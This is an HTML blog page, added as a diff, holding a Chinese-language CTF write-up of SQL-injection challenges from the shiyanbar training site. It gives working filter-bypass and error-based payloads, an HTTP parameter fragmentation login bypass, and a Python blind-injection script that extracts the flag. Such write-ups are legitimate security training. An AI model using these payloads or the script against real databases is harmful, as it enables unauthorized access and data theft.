@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://juniorprincewang.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","width":320,"display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":true,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="本篇博客连续更新实验吧的web篇解题思路。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧 web writeup">
+<meta property="og:url" content="http://juniorprincewang.github.io/2018/04/18/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="本篇博客连续更新实验吧的web篇解题思路。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-04-18T11:03:31.000Z">
+<meta property="article:modified_time" content="2021-03-26T11:25:07.021Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="sql">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2018/04/18/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>实验吧 web writeup | TO DO</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">TO DO</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/juniorprincewang" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2018/04/18/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          实验吧 web writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-04-18 19:03:31" itemprop="dateCreated datePublished" datetime="2018-04-18T19:03:31+08:00">2018-04-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-26 19:25:07" itemprop="dateModified" datetime="2021-03-26T19:25:07+08:00">2021-03-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">sql注入</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本篇博客连续更新实验吧的web篇解题思路。</p>
+<span id="more"></span>
+
+
+<h1 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h1><p>在ID框 输入1，有返回信息。</p>
+<pre><code>ID: 1
+name: baloteli
+</code></pre>
+<p>输入 <code>&#39;</code>，报错。</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;&#39; at line 1
+</code></pre>
+<p>然后输入所有关键字信息，看到底过滤了什么。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and or union select from where &#x3D; information_schema table_name table_schema column_name order by information_schema.tables --+ &#x2F;**&#x2F; &#x2F;&#x2F; # %00</span><br></pre></td></tr></table></figure>
+
+<p>得到信息：</p>
+<pre><code>ID: 1 or   = information_schema table_name information_schema.tables    /**/ //
+</code></pre>
+<p>看来屏蔽了不少关键字。</p>
+<p>对于过滤，可以考虑 <code>内联注释</code>、<code>双重关键字</code> 、 <code>大小写混用</code> 、 <code>编码</code> 。</p>
+<p><code>大小写混用</code> 不好使。</p>
+<p>这里尝试注入 <code>1&#39; or &#39;1&#39;=&#39;1</code>，得到正常信息，怀疑sql语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from xx where id&#x3D;&#39;xxx&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="采用-报错注入-内联注释-方式。"><a href="#采用-报错注入-内联注释-方式。" class="headerlink" title="采用 报错注入 + 内联注释 方式。"></a>采用 <code>报错注入</code> + <code>内联注释</code> 方式。</h2><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>采用 <code>/*! code */</code> 来执行我们的SQL语句。</p>
+<p>比如一个过滤器过滤了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union,where, table_name, table_schema, &#x3D;, and information_schema</span><br></pre></td></tr></table></figure>
+
+<p>这些都是我们内联注释需要绕过的目标。所以通常利用内联注释进行如下方式绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#x2F;*!UnIoN*&#x2F;+SeLeCT+1,2,concat(&#x2F;*!table_name*&#x2F;)+FrOM &#x2F;*information_schema*&#x2F;.tables &#x2F;*!WHERE *&#x2F;+&#x2F;*!TaBlE_ScHeMa*&#x2F;+like+database()-- -</span><br></pre></td></tr></table></figure>
+
+<p>这里我们需要的语句是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or updatexml(1,concat(&#39;~&#39;,(select database() LIMIT 0,1),&#39;~&#39;),3) or &#39;1&#39;&#x3D;&#39;1  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or updatexml(1,concat(&#39;~&#39;,(&#x2F;*!select*&#x2F; database() LIMIT 0,1),&#39;~&#39;),3) or &#39;1&#39;&#x3D;&#39;1  </span><br></pre></td></tr></table></figure>
+
+<p>得到反馈信息：</p>
+<pre><code>XPATH syntax error: &#39;~web1~&#39;
+</code></pre>
+<p>查表名字：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or updatexml(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema&#x3D;&#39;web1&#39; LIMIT 0,1),&#39;~&#39;),3) or &#39;1&#39;&#x3D;&#39;1 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or updatexml(1,concat(&#39;~&#39;,(&#x2F;*!select*&#x2F;  table_name  &#x2F;*!from*&#x2F; information_schema.tables &#x2F;*!where*&#x2F; &#x2F;*!table_schema*&#x2F;&#x3D;&#39;web1&#39; LIMIT 0,1),&#39;~&#39;),3) or &#39;1&#39;&#x3D;&#39;1 </span><br></pre></td></tr></table></figure>
+
+<p>这里报错了！</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;=&#39;web1&#39; limit 0,1),&#39;~&#39;),3) or &#39;1&#39;=&#39;1&#39;&#39; at line 1
+</code></pre>
+<p>明明在前面的验证中， <code>table_schema</code> 是被过滤的呀，添加了内联注释也不行？</p>
+<p>在尝试了<code>1 /*!table_schema*/</code> 之后发现，果然被过滤掉了。</p>
+<p>那采取 <code>双重关键字</code> 。 <code>table_schema</code> 换成 <code>table_schtable_schemaema</code></p>
+<p>输入 <code>1 table_schtable_schemaema</code> 得到 <code>&gt;ID: 1  table_schema</code>。很好。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or updatexml(1,concat(&#39;~&#39;,(&#x2F;*!select*&#x2F;  table_name  &#x2F;*!from*&#x2F; information_schema.tables &#x2F;*!where*&#x2F; &#x2F;*!table_schtable_schemaema*&#x2F;&#x3D;&#39;web1&#39; LIMIT 0,1),&#39;~&#39;),3) or &#39;1&#39;&#x3D;&#39;1 </span><br></pre></td></tr></table></figure>
+
+<p>拿到表格</p>
+<pre><code>XPATH syntax error: &#39;~flag~&#39;
+</code></pre>
+<p>之后继续拿字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or updatexml(1,concat(&#39;~&#39;,(&#x2F;*!select*&#x2F;  column_name &#x2F;*!from*&#x2F; information_schema.columns &#x2F;*!where*&#x2F; table_name&#x3D;&#39;flag&#39; LIMIT 0,1),&#39;~&#39;),3) or &#39;1&#39;&#x3D;&#39;1  </span><br></pre></td></tr></table></figure>
+
+<p>输入后，发现 <code>column_name</code> 、 <code>information_schema.columns</code> 都被过滤了，好奇怪。拿只好用 <code>双重关键字</code> 方法了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or updatexml(1,concat(&#39;~&#39;,(&#x2F;*!select*&#x2F;  colucolumn_namemn_name  &#x2F;*!from*&#x2F; infinformation_schema.columnsormation_schema.columns &#x2F;*!where*&#x2F; table_name&#x3D;&#39;flag&#39; LIMIT 0,1),&#39;~&#39;),3) or &#39;1&#39;&#x3D;&#39;1  </span><br></pre></td></tr></table></figure>
+
+<pre><code>XPATH syntax error: &#39;~flag~&#39;
+</code></pre>
+<p>得到表的字段：<code>flag</code>, <code>id</code></p>
+<p>直接获取 <code>flag</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or updatexml(1,concat(&#39;~&#39;,(&#x2F;*!select*&#x2F;  flag  &#x2F;*!from*&#x2F; flag LIMIT 0,1),&#39;~&#39;),3) or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<pre><code>XPATH syntax error: &#39;~flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;~&#39;
+</code></pre>
+<h2 id="双重关键字"><a href="#双重关键字" class="headerlink" title="双重关键字"></a><code>双重关键字</code></h2><h1 id="简单的SQL注入2"><a href="#简单的SQL注入2" class="headerlink" title="简单的SQL注入2"></a>简单的SQL注入2</h1><p>搞了半天就屏蔽了空格符号。那么把空格符替换掉就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag&#x2F;**&#x2F;where&#x2F;**&#x2F;&#39;1&#39;%3d&#39;1</span><br></pre></td></tr></table></figure>
+
+<pre><code>ID: 1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1&lt;br&gt;name: baloteli&lt;/pre&gt;&lt;pre&gt;ID: 1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1&lt;br&gt;name: flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;
+</code></pre>
+<h1 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h1><p>根据提示，本题修改HTTP数据传输方式为<code>POST</code>，传输数据为 <code>username=1&amp;password=1</code> 。</p>
+<p>提示</p>
+<blockquote>
+<p>Login failed</p>
+<!-- $sql="select * from users where username='$username' and password='$password'";  -->
+</blockquote>
+<p>绕过password：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39;&amp;password&#x3D;or&#39;1</span><br></pre></td></tr></table></figure>
+<p>构造的SQL语句为 </p>
+<blockquote>
+<p>select * from users where username=’1’<code>&#39; and password=&#39;</code>or’1’</p>
+</blockquote>
+<p>得到的显示结果为</p>
+<blockquote>
+<p>You are our member, welcome to enter</p>
+</blockquote>
+<p>没有给出回显字段，可以通过基于错误回显的SQL注入。</p>
+<p>先分别查看 <code>username</code> 和 <code>password</code> 过滤的字符串</p>
+<p><code>username</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--+ # &#x3D; - mid like union order limit substr rand ascii sleep ( ) </span><br></pre></td></tr></table></figure>
+
+<p><code>password</code>： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--+ # &#x3D; - mid like union order limit substr rand ascii sleep extractvalue updatexml</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP分割注入（HTTP-Parameter-Fragment）"><a href="#HTTP分割注入（HTTP-Parameter-Fragment）" class="headerlink" title="HTTP分割注入（HTTP Parameter Fragment）"></a>HTTP分割注入（HTTP Parameter Fragment）</h2><p>基于错误回显的注入为<br><code>updatexml(1,concat(0x7e,version(),0x7e),1)</code>，但是这条语句不能通过单一的参数传，两个参数过滤的关键字不同，<br>可以采用HTTP分割注入：<code>username</code> 未过滤 <code>updatexml</code> ，而 <code>password</code> 未过滤 <code>()</code>， 中间的语句通过注释符过滤掉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e, (version()),0x7e),1) or &#39;</span><br></pre></td></tr></table></figure>
+<p>得到回显错误：</p>
+<blockquote>
+<p>XPATH syntax error: ‘<del>5.5.47</del>‘</p>
+</blockquote>
+<p>那么接下来就是顺利成章的爆出数据库、表、字段和数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e,database(),0x7e),1) or &#39;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘<del>error_based_hpf</del>‘<br>password过滤了 <code>=</code> 和 <code>like</code>，那么可以采用 <code>regexp</code> 或者 不等号<code>&lt;&gt;</code> 来查询。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema regexp database(),0x7e),1) or &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上面的用例报错，由于没有在 <code>select group_concat(table_name) from information_schema.tables where table_schema regexp database()</code> 外面加括号导致，很费解，加上就好了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or &#39;</span><br><span class="line"># 或者</span><br><span class="line">username&#x3D;1&#39; or updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where !(table_schema&lt;&gt;database())),0x7e),1) or &#39;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘<del>ffll44jj,users</del>‘</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;),0x7e),1) or &#39;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘<del>value</del>‘</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e, (select group_concat(value) from ffll44jj),0x7e),1) or &#39;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘<del>flag{err0r_b4sed_sqli_+_hpf}</del>‘</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/s1ye/p/8284806.html">加了料的报错注入(实验吧)</a></p>
+<h1 id="简单的SQL注入3"><a href="#简单的SQL注入3" class="headerlink" title="简单的SQL注入3"></a>简单的SQL注入3</h1><p>字符型注入</p>
+<p>布尔型盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(*) from flag)&gt;0--+</span><br><span class="line">1&#39; and (select ascii(substr(flag,1,1)) from flag limit 0,1)&gt;97--+</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;index_3.php?id&#x3D;1&#39; and (select length(flag) from flag limit 0,1)&#x3D;&#123;0&#125;--+&quot;</span><br><span class="line">url2&#x3D;&quot;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;index_3.php?id&#x3D;1&#39; and (select ascii(substr(flag,&#123;0&#125;,1)) from flag limit 0,1)&#x3D;&#123;1&#125;--+&quot;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">i&#x3D;0</span><br><span class="line">while True:</span><br><span class="line">        i+&#x3D;1</span><br><span class="line">        res&#x3D;requests.get(url.format(i))</span><br><span class="line">        if res.content.find(&quot;Hello!&quot;)!&#x3D; -1:</span><br><span class="line">                print &quot;Found it, i&#x3D;&quot;,i</span><br><span class="line">                break</span><br><span class="line">        print &quot;Not found, i&#x3D;&quot;,i</span><br><span class="line"></span><br><span class="line">Found it, i&#x3D; 26</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">printable&#x3D;string.printable</span><br><span class="line">print &quot;printable is &quot;,printable</span><br><span class="line">result&#x3D;&quot;&quot;</span><br><span class="line">for i in range(26):</span><br><span class="line">        print &quot;Now i&#x3D;&quot;,i+1</span><br><span class="line">        for c in (printable):</span><br><span class="line">                res&#x3D;requests.get(url2.format(i+1, ord(c)))</span><br><span class="line">                if res.content.find(&quot;Hello!&quot;)!&#x3D; -1:</span><br><span class="line">                        print &quot;Found it, i&#x3D;&quot;,i+1, &quot;char is &quot;, c</span><br><span class="line">                        result+&#x3D;c</span><br><span class="line">                        break</span><br><span class="line">print &quot;result is &quot; , result</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="http://hebin.me/2017/09/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7ctf%E8%A7%A3%E9%A2%98writeup%E5%A4%A7%E5%85%A8/">西普实验吧CTF解题Writeup大全</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql/" rel="tag"># sql</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/04/16/shell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E7%AE%80%E4%BB%8B/" rel="prev" title="shell脚本编程简介">
+      <i class="fa fa-chevron-left"></i> shell脚本编程简介
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/04/24/Makefile%E8%AF%AD%E6%B3%95/" rel="next" title="make 命令">
+      make 命令 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">简单的SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%87%E7%94%A8-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A-%E6%96%B9%E5%BC%8F%E3%80%82"><span class="nav-number">1.1.</span> <span class="nav-text">采用 报错注入 + 内联注释 方式。</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">1.1.1.</span> <span class="nav-text">内联注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8C%E9%87%8D%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">1.2.</span> <span class="nav-text">双重关键字</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84SQL%E6%B3%A8%E5%85%A52"><span class="nav-number">2.</span> <span class="nav-text">简单的SQL注入2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A0%E4%BA%86%E6%96%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">加了料的报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP%E5%88%86%E5%89%B2%E6%B3%A8%E5%85%A5%EF%BC%88HTTP-Parameter-Fragment%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">HTTP分割注入（HTTP Parameter Fragment）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84SQL%E6%B3%A8%E5%85%A53"><span class="nav-number">4.</span> <span class="nav-text">简单的SQL注入3</span></a></li><li class="nav-item 